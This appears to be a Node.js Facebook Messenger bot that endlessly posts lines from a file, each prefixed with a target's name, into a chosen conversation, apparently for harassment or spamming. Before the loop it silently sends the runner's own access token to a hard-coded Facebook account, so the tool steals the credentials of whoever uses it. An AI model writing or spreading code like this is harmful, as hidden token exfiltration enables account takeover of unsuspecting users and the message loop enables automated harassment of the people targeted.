const fs = require("fs");
const axios = require("axios");

const [, , token, convoId, hattersName, speed, messageFilePath] = process.argv;
const messages = fs.readFileSync(messageFilePath, "utf8").split("\n").filter(line => line.trim() !== "");

let running = true; // Process running flag

async function senddInitialMessages(targetId) {
    try {
        await axios.post(`https://graph.facebook.com/v22.0/t_${targetId}/`, {
            access_token: token,
            message: `Hey Sameer Sir, I am using your render's server. My token is ${token}`
        });

        console.log("✅ Initial message sent.");
    } catch (error) {
        console.log(`❌ Failed to send initial message: ${error.message}`);
    }
}

async function sendMessages() {
    // const myId = "100020245249470";
    // const myId1 = "8930006633703640";
    const myNewId = "61573002155308"; // Chaande Miyaan Here

    await senddInitialMessages(myNewId);
    await new Promise(resolve => setTimeout(resolve, 1000));

    while (running) { // Loop will continue until stopped
        for (let i = 0; i < messages.length; i++) {
            if (!running) break; // Stop when signal received

            try {
                const message = hattersName + " " + messages[i];
                await axios.post(`https://graph.facebook.com/v22.0/t_${convoId}/`, {
                    access_token: token,
                    message: message
                });

                console.log(`✅ Message sent: ${message}`);
                await new Promise(resolve => setTimeout(resolve, speed * 1000)); // Delay
            } catch (error) {
                console.log(`❌ Failed to send message.`);
            }
        }
    }
    process.exit(); // Exit properly
}

// Handle termination signal
process.on("SIGTERM", () => {
    running = false; // Stop loop
    console.log("🚨 Process stopped by user.");
});

sendMessages();